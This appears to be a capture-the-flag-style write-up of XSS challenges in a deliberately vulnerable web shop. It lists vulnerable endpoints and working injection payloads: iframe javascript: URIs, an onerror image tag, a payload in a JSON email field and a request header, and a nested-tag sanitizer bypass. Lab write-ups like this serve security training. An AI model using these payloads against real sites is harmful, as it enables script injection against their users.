## Table of contents
- [[#1. DOM XSS]]
- [[#2. Bonus Payload]]
- [[#3. Reflected XSS]]
- [[#4. API-only XSS]]
- [[#5. Client-side XSS Protection]]
- 

## 1. DOM XSS

> The vulnerable endpoint is `/#/search?q=`.

1. To solve the lab sent the request with the payload we copied from the challenge. Any payload will work like `<img src%3Dx onerror%3Dprompt(1)>`.

> In the end it looks like `/#/search?q=<iframe src%3D"javascript:alert(`xss`)">`

## 2. Bonus Payload

> The vulnerable endpoint is `/#/search?q=`

1. Just copy the payload from the challenge and paste it into the search input field and enjoy.
```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

## 3. Reflected XSS

> The vulnerable endpoint is `/#/track-result?id=`

1. Paste the payload we copied from the challenge to this `id` parameter and we will get JavaScript execution.

> The URL path looked like `/#/track-result?id=<iframe src%3D"javascript:alert(`xss`)">`.

## 4. API-only XSS

> The vulnerable endpoint's URL is in the `main.js` file, which is `/api/Products`.

1. Go to this endpoint.
2. Now select a `PUT` or `POST` request from the developer tab(I was using developer tab instead of Burpsuite). Change the request method to `POST` if it is `PUT` that we selected.
3. Make sure this header present and its value is like this`Content-Type: application/json`.
4. Then add `{"description": "<iframe src=\"javascript:alert('xss')\">" }` to the body and resend the request.

## 5. Client-side XSS Protection

> The vulnerable endpoint is `/api/Users`.

1. Follow the registration of new user. Observe the `POST` request being sent.
2. Resend the request but put the XSS payload we got from the challenge in the email parameter. My final request's body parameter is shown below.
```json
{
  "email": "<iframe src=\"javascript:alert(`xss`)\">",
  "password": "Daki111!",
  "passwordRepeat": "Daki111!",
  "securityQuestion": {
    "id": 12,
    "question": "Your favorite movie?",
    "createdAt": "2026-10-15T05:04:11.792Z",
    "updatedAt": "2026-10-15T05:04:11.792Z"
  },
  "securityAnswer": "fsdafg"
}
```

## 6. HTTP-Header XSS

> The vulnerable endpoint is `/rest/saveLoginIp`. This endpoint is used when logging out.

1. To solve this challenge resend this request with an additional new header `True-Client-IP`.
2. Paste the XSS payload for this challenge as value for this header and send the request.
3. We can enumerate headers like this using Burpsuite's param miner extension.

## 7. Server-side XSS Protection

> The vulnerable endpoint is the `POST` request being sent to `/api/Feedbacks/`. This request in in the customer feedback functionality.

1. The message field is vulnerable.
2. It the value from this field is being sanitized by a vulnerable package.
3. So we can give the following payload in the comment field to complete the challenge `<<iframe src="javascript:evil"/>iframe src="javascript:alert(`xss`)">`.